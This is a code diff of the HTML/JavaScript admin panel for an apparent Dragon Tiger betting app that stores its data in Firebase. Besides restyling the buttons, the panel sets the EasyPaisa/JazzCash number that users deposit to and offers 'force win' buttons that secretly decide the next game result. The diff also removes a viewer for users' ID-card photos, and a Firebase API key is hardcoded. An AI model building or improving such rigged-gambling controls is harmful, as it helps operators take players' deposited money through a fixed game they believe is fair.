@@ -3,46 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Boom Admin Master Control</title>
+    <title>Boom Admin Master - 3D Control</title>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; padding: 15px; }
-        .card { background: #111; border: 1px solid #ffcc00; border-radius: 10px; padding: 15px; margin-bottom: 20px; }
-        h2 { color: #ffcc00; text-align: center; }
-        .btn { width: 100%; padding: 12px; margin: 5px 0; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
-        .btn-update { background: #ffcc00; color: #000; }
-        .btn-dragon { background: #007bff; color: #fff; }
-        .btn-tiger { background: #ff4444; color: #fff; }
-        .kyc-item { background: #222; padding: 10px; margin-top: 10px; border-radius: 8px; }
-        .img-grid { display: flex; gap: 10px; margin: 10px 0; }
-        .img-grid img { width: 48%; border: 1px solid #444; border-radius: 5px; }
+        body { background: #0a0a0a; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 20px; }
+        .card { background: #151515; border: 1px solid #333; border-radius: 20px; padding: 25px; margin-bottom: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h2 { color: #ffcc00; text-shadow: 0 0 10px rgba(255,204,0,0.3); }
+
+        /* --- 3D Button Style --- */
+        .btn-3d {
+            position: relative;
+            display: inline-block;
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            text-decoration: none;
+            text-align: center;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.1s ease;
+            box-shadow: 0 6px 0 #000; /* Bottom shadow for 3D look */
+        }
+        .btn-3d:active {
+            transform: translateY(4px); /* Push down effect */
+            box-shadow: 0 2px 0 #000;
+        }
+
+        .btn-dragon { background: linear-gradient(#ff4b2b, #ff416c); box-shadow: 0 6px 0 #b32a15; }
+        .btn-tiger { background: linear-gradient(#4b6cb7, #182848); box-shadow: 0 6px 0 #2a3d6d; }
+        .btn-update { background: linear-gradient(#ffcc00, #ff9900); color: black; box-shadow: 0 6px 0 #cc8800; }
+        .btn-random { background: linear-gradient(#444, #222); box-shadow: 0 6px 0 #111; }
+
+        input { width: 90%; padding: 15px; border-radius: 10px; border: 1px solid #444; background: #222; color: #fff; margin-bottom: 10px; font-size: 16px; }
+        .status-box { background: #000; padding: 10px; border-radius: 8px; color: #00ff00; font-family: monospace; }
     </style>
 </head>
 <body>
 
-    <h2>🚀 BOOM ADMIN MASTER</h2>
+    <h2>🚀 BOOM ADMIN MASTER CONTROL</h2>
 
     <div class="card">
-        <h3>💰 UPDATE DEPOSIT DETAILS</h3>
-        <input type="text" id="dep-num" placeholder="EasyPaisa/JazzCash Number" style="width:90%; padding:10px; margin-bottom:10px;">
-        <button class="btn btn-update" onclick="saveDep()">UPDATE USER APP</button>
+        <h3>💰 SET DEPOSIT NUMBER</h3>
+        <input type="text" id="admin-num" placeholder="EasyPaisa/JazzCash Number">
+        <button class="btn-3d btn-update" onclick="updateNumber()">UPDATE USER APP 📲</button>
     </div>
 
     <div class="card">
-        <h3>🎮 GAME RESULT CONTROL</h3>
-        <button class="btn btn-dragon" onclick="force('dragon')">DRAGON WIN</button>
-        <button class="btn btn-tiger" onclick="force('tiger')">TIGER WIN</button>
-        <button class="btn" style="background:#444; color:#fff;" onclick="force('random')">RANDOM MODE</button>
-    </div>
-
-    <div class="card">
-        <h3>📥 PENDING KYC (FRONT & BACK)</h3>
-        <div id="kyc-list">Loading Requests...</div>
+        <h3>🎮 GAME RESULT (FORCE WIN)</h3>
+        <div class="status-box" id="current-mode">Current Mode: LOADING...</div>
+        <button class="btn-3d btn-dragon" onclick="setMode('dragon')">FORCE DRAGON WIN 🐉</button>
+        <button class="btn-3d btn-tiger" onclick="setMode('tiger')">FORCE TIGER WIN 🐯</button>
+        <button class="btn-3d btn-random" onclick="setMode('random')">RANDOM (NORMAL) 🎲</button>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-app.js";
-        import { getDatabase, ref, set, onValue, remove, update } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-database.js";
+        import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-database.js";
 
+        // Aapka Firebase Config
         const firebaseConfig = {
             apiKey: "AIzaSyALm0SnUYjeeh4kJj9QBk4BgaINwnooa3c",
             authDomain: "boom-earnings.firebaseapp.com",
@@ -54,50 +75,25 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        // --- Deposit Number ---
-        window.saveDep = () => {
-            const val = document.getElementById('dep-num').value;
-            set(ref(db, 'admin/deposit_number'), val).then(() => alert("Updated!"));
+        // --- Deposit Number Function ---
+        window.updateNumber = () => {
+            const num = document.getElementById('admin-num').value;
+            if(!num) { alert("Sain, number toh likhein!"); return; }
+            set(ref(db, 'admin/deposit_number'), num)
+            .then(() => alert("User Application Updated Successfully!"));
         };
 
-        // --- Force Win ---
-        window.force = (side) => {
-            set(ref(db, 'game_settings/next_winner'), side).then(() => alert("Forced: " + side));
+        // --- Game Force Mode Function ---
+        window.setMode = (mode) => {
+            set(ref(db, 'game_settings/next_winner'), mode)
+            .then(() => alert("Game Mode Set To: " + mode.toUpperCase()));
         };
 
-        // --- KYC Viewer (Dono Images) ---
-        onValue(ref(db, 'kyc_submissions'), (snap) => {
-            const list = document.getElementById('kyc-list');
-            const data = snap.val();
-            if (!data) { list.innerHTML = "No pending KYC."; return; }
-
-            let html = "";
-            for (let id in data) {
-                html += `
-                    <div class="kyc-item">
-                        <p>User: ${id}</p>
-                        <div class="img-grid">
-                            <img src="${data[id].front_id_url}" title="Front Side">
-                            <img src="${data[id].back_id_url}" title="Back Side">
-                        </div>
-                        <button class="btn btn-update" onclick="approve('${id}')">APPROVE ✅</button>
-                        <button class="btn" style="background:red; color:white; margin-top:5px;" onclick="reject('${id}')">REJECT ❌</button>
-                    </div>
-                `;
-            }
-            list.innerHTML = html;
+        // Live Mode Viewer
+        onValue(ref(db, 'game_settings/next_winner'), (snap) => {
+            document.getElementById('current-mode').innerText = "Current Mode: " + (snap.val() || "random").toUpperCase();
         });
-
-        window.approve = (id) => {
-            update(ref(db, 'users/' + id), { kyc_status: 'verified' }).then(() => {
-                remove(ref(db, 'kyc_submissions/' + id));
-                alert("Approved!");
-            });
-        };
-
-        window.reject = (id) => {
-            remove(ref(db, 'kyc_submissions/' + id)).then(() => alert("Rejected!"));
-        };
     </script>
 </body>
 </html>
+
